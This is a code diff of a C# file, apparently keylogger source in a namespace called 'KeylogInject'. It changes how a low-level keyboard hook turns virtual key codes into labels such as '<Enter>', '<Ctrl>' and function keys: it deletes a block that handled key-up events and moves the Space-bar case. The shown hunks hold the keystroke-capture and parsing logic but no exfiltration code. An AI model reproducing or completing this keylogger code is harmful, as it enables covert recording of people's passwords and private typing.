@@ -50,134 +50,7 @@ namespace KeylogInject
 
                     // read virtual key from buffer
                     vKey = Marshal.ReadInt32(lParam);
-                    if (msgType == 0x101)
-                    {
-                        switch ((Keys)vKey)
-                        {
-                            case Keys.F1:
-                                key = "<F1>";
-                                break;
-                            case Keys.F2:
-                                key = "<F2>";
-                                break;
-                            case Keys.F3:
-                                key = "<F3>";
-                                break;
-                            case Keys.F4:
-                                key = "<F4>";
-                                break;
-                            case Keys.F5:
-                                key = "<F5>";
-                                break;
-                            case Keys.F6:
-                                key = "<F6>";
-                                break;
-                            case Keys.F7:
-                                key = "<F7>";
-                                break;
-                            case Keys.F8:
-                                key = "<F8>";
-                                break;
-                            case Keys.F9:
-                                key = "<F9>";
-                                break;
-                            case Keys.F10:
-                                key = "<F10>";
-                                break;
-                            case Keys.F11:
-                                key = "<F11>";
-                                break;
-                            case Keys.F12:
-                                key = "<F12>";
-                                break;
-
-                            //case Keys.Snapshot:
-                            //    key = "<Print Screen>";
-                            //    break;
-                            //case Keys.Scroll:
-                            //    key = "<Scroll Lock>";
-                            //    break;
-                            //case Keys.Pause:
-                            //    key = "<Pause/Break>";
-                            //    break;
-                            case Keys.Insert:
-                                key = "<Insert>";
-                                break;
-                            //case Keys.Home:
-                            //    key = "<Home>";
-                            //    break;
-                            case Keys.Delete:
-                                key = "<Delete>";
-                                break;
-                            //case Keys.End:
-                            //    key = "<End>";
-                            //    break;
-                            //case Keys.Prior:
-                            //    key = "<Page Up>";
-                            //    break;
-                            //case Keys.Next:
-                            //    key = "<Page Down>";
-                            //    break;
-                            //case Keys.Escape:
-                            //    key = "<Esc>";
-                            //    break;
-                            //case Keys.NumLock:
-                            //    key = "<Num Lock>";
-                            //    break;
-                            //case Keys.Capital:
-                            //    key = "<Caps Lock>";
-                            //    break;
-                            case Keys.Tab:
-                                key = "<Tab>";
-                                break;
-                            case Keys.Back:
-                                key = "<Backspace>";
-                                break;
-                            case Keys.Enter:
-                                key = "<Enter>";
-                                break;
-                            case Keys.Space:
-                                key = "<Space Bar>";
-                                break;
-                            case Keys.Left:
-                                key = "<Left>";
-                                break;
-                            case Keys.Up:
-                                key = "<Up>";
-                                break;
-                            case Keys.Right:
-                                key = "<Right>";
-                                break;
-                            case Keys.Down:
-                                key = "<Down>";
-                                break;
-                            case Keys.LMenu:
-                                key = "<Alt>";
-                                break;
-                            case Keys.RMenu:
-                                key = "<Alt>";
-                                break;
-                            case Keys.LWin:
-                                key = "<Windows Key>";
-                                break;
-                            case Keys.RWin:
-                                key = "<Windows Key>";
-                                break;
-                            //case Keys.LShiftKey:
-                            //    key = "<Shift>";
-                            //    break;
-                            //case Keys.RShiftKey:
-                            //    key = "<Shift>";
-                            //    break;
-                            case Keys.LControlKey:
-                                key = "<Ctrl>";
-                                break;
-                            case Keys.RControlKey:
-                                key = "<Ctrl>";
-                                break;
-                        }
-                    }
-                    else if (msgType == 0x100 || msgType == 0x104)
+                    if (msgType == 0x100 || msgType == 0x104)
                     {
                         // Parse key
                         if (vKey == 86 && ctrl)
@@ -467,6 +340,9 @@ namespace KeylogInject
                                 //case Keys.Capital:
                                 //    key = "<Caps Lock>";
                                 //    break;
+                                case Keys.Space:
+                                    key = "<Space Bar>";
+                                    break;
                                 case Keys.Tab:
                                     key = "<Tab>";
                                     break;
@@ -475,9 +351,6 @@ namespace KeylogInject
                                     break;
                                 case Keys.Enter:
                                     key = "<Enter>";
-                                    break;
-                                case Keys.Space:
-                                    key = "<Space Bar>";
                                     break;
                                 case Keys.Left:
                                     key = "<Left>";
